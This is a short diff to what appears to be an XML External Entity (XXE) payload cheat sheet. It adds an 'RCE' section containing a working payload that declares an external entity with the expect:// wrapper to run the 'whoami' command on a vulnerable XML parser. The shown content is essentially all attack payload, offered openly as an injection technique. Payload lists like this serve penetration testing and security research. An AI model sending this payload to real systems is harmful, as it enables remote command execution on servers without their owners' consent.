@@ -82,3 +82,10 @@ XML Parameter Entities
   %xxe;
 ]>
 
+RCE
+------------
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "expect://whoami">
+]>
+<foo>&xxe;</foo>
+
